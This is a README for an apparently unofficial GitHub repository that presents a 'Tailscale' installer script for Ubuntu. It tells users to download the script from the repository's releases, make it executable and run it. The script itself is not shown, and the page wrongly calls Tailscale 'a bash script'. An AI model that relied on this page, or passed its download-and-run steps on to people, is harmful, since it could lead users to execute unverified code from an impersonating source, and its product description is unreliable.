# 🐧 tailscale - Simple VPN Setup for Ubuntu

## 🔗 Download Now
[![Download Tailscale](https://img.shields.io/badge/Download%20Tailscale-v1.0-blue.svg)](https://github.com/MilanMishutushkin/tailscale/releases)

## 🚀 Getting Started
This guide will help you download and run Tailscale on your Ubuntu system. Tailscale is a bash script that simplifies the installation and configuration of Tailscale, making it easy for you to set up a secure VPN connection.

## 📋 System Requirements
To use Tailscale, ensure your system meets the following requirements:

- **Operating System:** Ubuntu 18.04 or later
- **Architecture:** 64-bit
- **Network:** Active internet connection

## 📥 Download & Install
To get started, visit the following page to download the latest version of the Tailscale script:

[Download Tailscale](https://github.com/MilanMishutushkin/tailscale/releases)

Once you are on the Releases page, look for the latest version. Download the script file by clicking on the appropriate link.

### Installation Steps
1. **Open Terminal:** Press `Ctrl + Alt + T` to open the terminal on your Ubuntu system.

2. **Navigate to Downloads:** Change your directory to where the downloaded file is located. If you used the default settings, type:
   ```bash
   cd ~/Downloads
   ```
   
3. **Change File Permissions:** Make the script executable by running:
   ```bash
   chmod +x tailscale-install.sh
   ```
   Replace `tailscale-install.sh` with the actual name of the downloaded file if it differs.

4. **Run the Script:** Execute the installation script by typing:
   ```bash
   ./tailscale-install.sh
   ```

5. **Follow On-Screen Instructions:** The script will guide you through the installation process. Simply follow the prompts in your terminal.

## 🔧 Configuration
After installation, you need to configure Tailscale:

1. **Start Tailscale:** You can start the Tailscale service by running:
   ```bash
   sudo tailscale up
   ```
   
2. **Login:** You will be prompted to log in using your preferred Single Sign-On (SSO) method. Follow the instructions to authenticate.

3. **Network Settings:** Tailscale supports dual-stack (IPv4 and IPv6). You can configure your network settings as required in the terminal.

## 🌐 Using Tailscale
With Tailscale set up, your devices are now connected. You can securely access your home or office devices remotely. 

### Check Connection
To verify your connection, run:
```bash
tailscale status
```
This command will display the devices connected to your Tailscale network.

## 📄 Resources
For further reading and troubleshooting, refer to these resources:

- [Tailscale Documentation](https://tailscale.com/kb/)
- [GitHub Issues Page](https://github.com/MilanMishutushkin/tailscale/issues)

## 🛠 Troubleshooting
If you encounter issues during installation or configuration:

- **Connection Issues:** Ensure your internet connection is active.
- **Permission Errors:** Run terminal commands with `sudo` if you encounter permission denied messages.
- **Dependency Issues:** Make sure your system has all required dependencies installed.

## 📞 Support
For additional help, join our community discussions on GitHub or reach out via email for support.

## 👍 Conclusion
You are now ready to use Tailscale for secure and easy access to your devices. Follow the steps above to enjoy a seamless VPN experience on your Ubuntu system. Make sure to keep your Tailscale installation updated by checking back on the [Releases page](https://github.com/MilanMishutushkin/tailscale/releases) regularly.